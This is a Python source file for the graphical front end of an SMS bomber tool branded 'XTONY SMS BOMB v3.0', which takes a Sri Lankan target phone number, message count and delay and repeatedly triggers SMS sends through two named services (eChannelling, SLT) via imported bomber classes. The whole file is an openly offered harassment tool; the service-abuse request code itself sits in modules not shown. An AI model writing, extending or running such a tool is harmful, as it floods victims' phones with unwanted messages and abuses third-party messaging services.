import customtkinter as ctk
from PIL import Image
import threading
import time
import os
import sys

# Import core and services
from core.utils import validate_phone
from core.base import set_shutdown_flag, set_interrupted_flag, get_shutdown_flag
from services import get_bomber_class

# Helper to find assets when bundled as EXE
def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# --- Configuration ---
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("green")

class SMSBombGUI(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("xtony.exe - SMS BOMB v3.0")
        self.geometry("400x650")
        self.resizable(False, False)
        self.configure(fg_color="#000000")
        
        # Set Window Icon
        try:
            self.iconbitmap(resource_path("icon.ico"))
        except Exception:
            pass

        # --- UI Setup ---
        self.setup_ui()
        
        # --- Engine State ---
        self.is_running = False

    def setup_ui(self):
        # Header
        header = ctk.CTkLabel(self, text="xtony.exe", font=("Consolas", 14), text_color="#00FF00")
        header.pack(pady=(10, 5), padx=20, anchor="nw")

        # Skull Icon
        icon_path = resource_path("neon_green_skull_icon.png")
        if os.path.exists(icon_path):
            try:
                skull_img = Image.open(icon_path)
                self.skull_photo = ctk.CTkImage(light_image=skull_img, dark_image=skull_img, size=(120, 120))
                skull_label = ctk.CTkLabel(self, image=self.skull_photo, text="")
                skull_label.pack(pady=10)
            except Exception:
                pass

        # Main Title
        ctk.CTkLabel(self, text="XTONY SMS BOMB v3.0", font=("Consolas", 20, "bold"), text_color="#00FF00").pack(pady=5)
        ctk.CTkLabel(self, text="..:: THE ULTIMATE SMS BOMBER ::..", font=("Consolas", 12), text_color="#00FF00").pack(pady=(0, 20))

        # --- Inputs ---
        container = ctk.CTkFrame(self, fg_color="transparent")
        container.pack(fill="x", padx=30)

        self.target_entry = self.create_input_row(container, "TARGET NUMBER :", "07XXXXXXXX")
        self.create_dropdown_row(container, "COUNTRY :", ["SRI LANKA (+94)"])
        self.count_entry = self.create_input_row(container, "MESSAGE COUNT :", "50")
        self.delay_entry = self.create_input_row(container, "DELAY (ms) :", "1000")

        # --- Buttons ---
        self.start_btn = self.create_btn("START BOMBING", self.start_attack)
        self.start_btn.pack(pady=(30, 10), padx=30, fill="x")

        self.stop_btn = self.create_btn("STOP", self.stop_attack)
        self.stop_btn.pack(pady=5, padx=30, fill="x")

        # --- Status ---
        status_container = ctk.CTkFrame(self, fg_color="transparent")
        status_container.pack(pady=20, padx=30, fill="x")
        
        ctk.CTkLabel(status_container, text="STATUS :", font=("Consolas", 14, "bold"), text_color="#FFFFFF").pack(side="left")
        self.status_label = ctk.CTkLabel(status_container, text="IDLE", font=("Consolas", 14, "bold"), text_color="#00FF00")
        self.status_label.pack(side="left", padx=10)

    def create_input_row(self, master, label_text, placeholder):
        row = ctk.CTkFrame(master, fg_color="transparent")
        row.pack(fill="x", pady=5)
        ctk.CTkLabel(row, text=label_text, font=("Consolas", 12), text_color="#FFFFFF", width=120, anchor="w").pack(side="left")
        entry = ctk.CTkEntry(row, placeholder_text=placeholder, fg_color="#1A1A1A", border_color="#333333", text_color="#00FF00", font=("Consolas", 12))
        entry.pack(side="right", fill="x", expand=True)
        return entry

    def create_dropdown_row(self, master, label_text, values):
        row = ctk.CTkFrame(master, fg_color="transparent")
        row.pack(fill="x", pady=5)
        ctk.CTkLabel(row, text=label_text, font=("Consolas", 12), text_color="#FFFFFF", width=120, anchor="w").pack(side="left")
        dropdown = ctk.CTkComboBox(row, values=values, fg_color="#1A1A1A", border_color="#333333", text_color="#00FF00", font=("Consolas", 12), button_color="#333333")
        dropdown.pack(side="right", fill="x", expand=True)

    def create_btn(self, text, command):
        return ctk.CTkButton(
            self, text=text, font=("Consolas", 16, "bold"),
            fg_color="transparent", border_color="#00FF00", border_width=1,
            text_color="#00FF00", height=45, hover_color="#003300",
            command=command
        )

    def log_status(self, msg, color="#00FF00"):
        self.status_label.configure(text=msg, text_color=color)

    def start_attack(self):
        if self.is_running: return
        
        phone = self.target_entry.get() or self.target_entry.cget("placeholder_text")
        valid, phone = validate_phone(phone)
        if not valid:
            self.log_status("INVALID NUMBER", "#FF0000")
            return

        try:
            count = int(self.count_entry.get() or self.count_entry.cget("placeholder_text"))
            delay = float(self.delay_entry.get() or self.delay_entry.cget("placeholder_text")) / 1000.0
        except ValueError:
            self.log_status("INVALID INPUTS", "#FF0000")
            return

        self.is_running = True
        self.log_status("BOMBING...", "#00FF00")
        self.start_btn.configure(state="disabled")
        
        threading.Thread(target=self.attack_thread, args=(phone, count, delay), daemon=True).start()

    def stop_attack(self):
        set_shutdown_flag(True)
        self.log_status("STOPPING...", "#FFFF00")

    def attack_thread(self, phone, count, delay):
        set_shutdown_flag(False)
        
        services = ["eChannelling", "SLT"]
        bombers = []
        for s in services:
            cls = get_bomber_class(s)
            if cls: bombers.append(cls(phone))
        
        if not bombers:
            self.after(0, lambda: self.log_status("NO SERVICES", "#FF0000"))
            self.after(0, self.reset_ui)
            return

        total_sent = 0
        msgs_per_service = count // len(bombers)
        
        try:
            for bomber in bombers:
                if get_shutdown_flag(): break
                for i in range(msgs_per_service):
                    if get_shutdown_flag(): break
                    if bomber.send_one():
                        total_sent += 1
                        self.after(0, lambda s=total_sent: self.log_status(f"SENT: {s}", "#00FF00"))
                    time.sleep(delay)
        except Exception:
            pass
        
        self.is_running = False
        self.after(0, self.reset_ui)

    def reset_ui(self):
        self.start_btn.configure(state="normal")
        if get_shutdown_flag():
            self.log_status("STOPPED", "#FFFF00")
        else:
            self.log_status("COMPLETE", "#00FF00")

if __name__ == "__main__":
    app = SMSBombGUI()
    app.mainloop()
